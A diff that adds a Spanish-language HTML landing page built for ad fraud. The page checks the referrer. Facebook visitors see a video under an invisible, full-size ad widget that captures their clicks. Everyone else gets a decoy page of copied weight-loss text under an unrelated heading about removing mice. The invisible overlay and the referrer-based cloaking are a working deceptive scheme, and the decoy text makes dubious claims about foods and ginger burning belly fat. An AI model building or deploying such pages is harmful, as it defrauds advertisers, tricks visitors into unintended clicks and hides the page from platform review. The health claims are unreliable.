@@ -1,0 +1,97 @@
+
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QWEWQ</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #333;
+            color: #fff;
+            padding: 20px;
+            text-align: center;
+        }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            position: relative; /* Permite posicionar el anuncio sobre el video */
+        }
+        video {
+            width: 100%;
+            height: auto;
+        }
+        #ad-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1; /* Coloca el anuncio por encima del video */
+            opacity: 0; /* Hace el anuncio completamente invisible */
+        }
+        #content, #alternative-content {
+            display: none; /* Ocultamos los contenidos por defecto */
+        }
+        #alternative-content h2 {
+            text-align: center; /* Centra el texto del título */
+        }
+        #alternative-content p {
+            text-align: justify; /* Alinea el texto de los párrafos a la izquierda */
+        }
+    </style>
+</head>
+<body>
+
+<div id="content">
+    <div class="container">
+        <!-- Contenedor del anuncio, completamente invisible -->
+        <div id="ad-container">
+            <!-- Widget Start -->
+            <div id="_AdQVAWidget_17293"></div>
+            <script type="text/javascript" src="https://servicer.adqva.com/ads/_AdQVAWidget_17293.js" async></script>
+            <!-- Widget End -->
+        </div>
+
+        <!-- Video -->
+        <video id="landing-video" controls autoplay playsinline>
+            <source src="VIDEO" type="video/mp4">
+            Tu navegador no soporta la etiqueta de video.
+        </video>
+    </div>
+</div>
+
+<div id="alternative-content">
+    <!-- Contenido alternativo para visitantes que no provienen de Facebook -->
+    <div class="container">
+        <h2>COMO SACAR LOS RATONES</h2>
+        <p> La grasa acumulada en la barriga es la más complicada de eliminar pues, para lograrlo, se tiene que hacer un esfuerzo centrado en tomar alimentos diuréticos, que ayuden a bajar la hinchazón de la zona y a quemar la grasa acumulada. Además, es importante seguir una rutina de ejercicios abdominales. Además, también existen algunos trucos caseros para perder barriga como la infusión de canela y laurel y las semillas de lino.</p>
+        <p>Si estás en un momento en el que cuidas de tu dieta, debes saber que puedes acelerar la pérdida de grasa gracias a las propiedades de algunos ingredientes naturales que te ayudarán a lograr tu objetivo. En este artículo de unCOMO te descubrimos los mejores remedios caseros para un vientre plano que te ayudarán a lucir un cuerpo de infarto y a eliminar la acumulación de michelines en tu barriga.</p>
+        <p> Para conseguir un vientre plano también puedes aprovechar los beneficios del jengibre, una planta que tiene propiedades ideales para bajar de peso y quemar la grasa acumulada en la barriga. El motivo es que el jengibre actúa como un quemagrasas al activar el funcionamiento del metabolismo y, por tanto, hacer que nuestro cuerpo consuma una mayor cantidad de calorías diarias de las que habitualmente consume.</p>
+        <p>Además de esto, el jengibre también es ideal para bajar la hinchazón del vientre y para mejorar los procesos digestivos haciendo, por tanto, que las digestiones sean más saludables, que se eviten condiciones como el estreñimiento y que se depure el organismo de forma natural.</p>
+        <p>Por todo esto, el jengibre también debe estar en este listado de los remedios caseros para un vientre plano ya que nos ayudará a sentirnos mejor y a quemar la grasa localizada en dicha zona. Para aprovechar sus beneficios puedes realizar lo siguiente:</p>
+    </div>
+</div>
+
+<script>
+    // Detectar si el usuario llega desde Facebook
+    var referrer = document.referrer;
+    
+    if (referrer.includes('facebook.com')) {
+        // Mostrar el contenido si el referer es Facebook
+        document.getElementById('content').style.display = 'block';
+    } else {
+        // Mostrar contenido alternativo si el referer no es Facebook
+        document.getElementById('alternative-content').style.display = 'block';
+    }
+</script>
+
+</body>
+</html>
